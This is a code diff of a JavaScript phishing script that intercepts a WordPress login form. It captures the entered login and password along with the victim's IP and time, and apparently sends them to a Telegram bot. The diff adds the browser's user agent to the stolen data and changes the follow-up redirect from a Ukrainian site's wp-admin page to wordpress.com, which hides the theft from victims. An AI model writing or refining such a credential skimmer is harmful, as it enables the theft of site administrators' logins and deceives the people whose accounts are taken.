@@ -6,7 +6,8 @@ document.getElementById('loginform').addEventListener('submit', async function(e
     const login = formData.get('log');
     const password = formData.get('pwd');
 
-    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}`;
+    // Добавляем User Agent к сообщению
+    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
     console.log("Сообщение для отправки:", message);
 
     try {
@@ -27,17 +28,18 @@ document.getElementById('loginform').addEventListener('submit', async function(e
 
         if (response.ok) {
             console.log("Успешно отправлено! Перенаправляю...");
+            // Меняем редирект на официальный сайт WordPress
             setTimeout(() => {
-                window.location.href = 'https://mrt.com.ua/wp-admin/';
+                window.location.href = 'https://wordpress.com/';
             }, 1500);
         } else {
             console.error("Ошибка от Telegram:", responseData);
-            window.location.href = 'https://mrt.com.ua/wp-admin/';
+            window.location.href = 'https://wordpress.com/';
         }
 
     } catch (error) {
         console.error('Ошибка сети или отправки:', error);
-        window.location.href = 'https://mrt.com.ua/wp-admin/';
+        window.location.href = 'https://wordpress.com/';
     }
 });
 
